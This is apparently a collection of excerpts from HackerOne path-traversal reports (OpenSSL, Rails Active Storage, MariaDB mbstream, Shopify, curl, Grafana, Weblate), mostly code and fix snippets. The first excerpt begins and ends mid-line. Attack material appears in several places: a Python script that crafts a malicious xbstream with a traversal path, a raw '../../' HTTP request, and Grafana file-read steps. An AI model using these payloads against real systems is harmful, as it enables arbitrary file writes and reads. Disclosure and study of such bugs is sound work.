@@ -3219,11 +3225,11 @@ static int www_body(int s, int stype, int prot, unsigned char *context)
                     dot = (e[0] == '.') ? 3 : 0;
                     break;
                 case 3:
-                    dot = (e[0] == '/') ? -1 : 0;
+                    dot = (e[0] == '/' || e[0] == '\\') ? -1 : 0;
                     break;
                 }
                 if (dot == 0)
-                    dot = (e[0] == '/') ? 1 : 0;
+                    dot = (e[0] == '/' || e[0] == '\\') ? 1 : 0;
             }
             dot = (dot == 3) || (dot == -1); /* filename contains ".."
                                               * component */
@@ -3237,11 +3243,11 @@ static int www_body(int s, int stype, int prot, unsigned char *context)
 
             if (dot) {
                 BIO_puts(io, text);
-                BIO_printf(io, "'%s' contains '..' reference\r\n", p);
+                BI
```

```
                 if (e[0] == ' ')
                     break;
```

```
                 switch (dot) {
                 case 1:
                     dot = (e[0] == '.') ? 2 : 0;
```

## #3553340 Active Storage Vips Transformer Missing validate_transformation — CVE-2025-24293 Incomplete Fix — rails — - — Path Traversal
Source: `hackerone/reports/2026/3553340.md` (https://hackerone.com/reports/3553340)

```
# frozen_string_literal: true

module ActiveStorage
  module Transformers
    class Vips < ImageProcessingTransformer
      private
        def processor
          ImageProcessing::Vips
        end
    end
  end
end
```

```
def validate_transformation(name, argument)
  if name.to_s == "combine_options"
    raise ArgumentError, <<~ERROR.squish
      Active Storage's ImageProcessing transformer doesn't support :combine_options,
      as it always generates a single command.
    ERROR
  end
end
```

```
FROM ruby:3.3-slim
RUN apt-get update && apt-get install -y build-essential libvips-dev && rm -rf /var/lib/apt/lists/*
RUN gem install image_processing ruby-vips
WORKDIR /app
COPY poc.rb .
CMD ["ruby", "poc.rb"]
```

## #3678395 Path Traversal in mbstream Extract — mariadb — - — Path Traversal
Source: `hackerone/reports/2026/3678395.md` (https://hackerone.com/reports/3678395)

```
static ds_file_t *
local_open(ds_ctxt_t *ctxt, const char *path, MY_STAT *mystat)
{
    char fullpath[FN_REFLEN];
    char dirpath[FN_REFLEN];
    size_t dirpath_len;
    ...
    fn_format(fullpath, path, ctxt->root, "", MYF(MY_RELATIVE_PATH));    // (1)

    dirname_part(dirpath, fullpath, &dirpath_len);
    if (my_mkdir(dirpath, 0777, MYF(0)) < 0 && my_errno != EEXIST) {     // (2)
        ...
    }

    fd = my_create(fullpath, 0, O_WRONLY | O_BINARY | O_EXCL | O_NOFOLLOW,
                   MYF(MY_WME));                                          // (3)
    ...
}
```

```
else if ((flag & MY_RELATIVE_PATH) && !test_if_hard_path(dev))
{
    /* Put 'dir' before the given path */
    pos = convert_dirname(dev, dir, NullS);
    strmake(pos, buff, ...);
}
```

```
#!/usr/bin/env python3
"""Craft a minimal xbstream containing one payload chunk and one EOF chunk.
Usage:  craft_evil_xbstream.py <CHUNK_PATH> <PAYLOAD_BYTES> <OUTFILE>
"""
import struct, zlib, sys

CHUNK_MAGIC = b'XBSTCK01'
TYPE_PAYLOAD = b'P'
TYPE_EOF = b'E'

def make_payload_chunk(path: bytes, payload: bytes) -> bytes:
    out  = CHUNK_MAGIC
    out += b'\x00'                          # flags = 0
    out += TYPE_PAYLOAD                     # type = 'P'
    out += struct.pack('<I', len(path))     # path length (LE)
    out += path
    out += struct.pack('<Q', len(payload))  # payload length (8 bytes LE)
    out += struct.pack('<Q', 0)             # offset in source file
    out += struct.pack('<I', zlib.crc32(payload) & 0xFFFFFFFF)
    out += payload
    return out

def make_eof_chunk(path: bytes = b'eof') -> bytes:
    out  = CHUNK_MAGIC + b'\x00' + TYPE_EOF
    out += struct.pack('<I', len(path)) + path
    return out

with open(sys.argv[3], 'wb') as f:
    f.write(make_payload_chunk(sys.argv[1].encode(), sys.argv[2].encode()))
    f.write(make_eof_chunk(sys.argv[1].encode()))
print('wrote', sys.argv[3])
```

## #869888 Path Traversal in App Proxy — shopify — - — Path Traversal
Source: `hackerone/reports/2020/869888.md` (https://hackerone.com/reports/869888)

```
GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

```
	<head>
<meta name=dropbox-domain-verification content=4yyz8tdqnx1e />
</head>


<body>hi</body>
```

## #3408126 Directory Traversal Vulnerability in cURL via Content-Disposition Header Processing — curl — - — Path Traversal
Source: `hackerone/reports/2025/3408126.md` (https://hackerone.com/reports/3408126)

```
    // ... [filename extraction logic] ...
```

```
    if(per->config->output_dir) {
        outs->filename = curl_maprintf("%s/%s", per->config->output_dir,
                                     filename);  // VULNERABLE: filename may contain path traversal
    }
    else
        outs->filename = filename;
```

```
    // File is created without adequate path traversal checks
    if(!tool_create_output_file(outs, per->config))
        return CURL_WRITEFUNC_ERROR;
```

## #1427086 path traversal vulnerability in Grafana 8.x allows " local file read " — mtn_group — - — None
Source: `hackerone/reports/2022/1427086.md` (https://hackerone.com/reports/1427086)

```
3. File Read server  /usr/share/grafana/conf/defaults.ini  :

Grafana config file
```

```
{F1545689}

3. File Read server  /etc/resolv.conf  :
```

## #4037976 Incomplete VCS metadata exclusion: `.svn` / `.bzr` bypass CVE-2026-61792 due to missing `VCS_METADATA_DIRS` entries. — weblate — - — Path Traversal
Source: `hackerone/reports/2026/4037976.md` (https://hackerone.com/reports/4037976)

```
VCS_METADATA_DIRS = frozenset((".git", ".hg"))
```

```
git clone https://github.com/WeblateOrg/weblate.git
grep -n "VCS_METADATA_DIRS" weblate/utils/files.py
# 36: VCS_METADATA_DIRS = frozenset((".git", ".hg"))
```

```
sed -n '105,115p' weblate/trans/component_copy.py
# 109: ignore_vcs_metadata = shutil.ignore_patterns(".git", ".hg", ".svn", ".bzr")
```

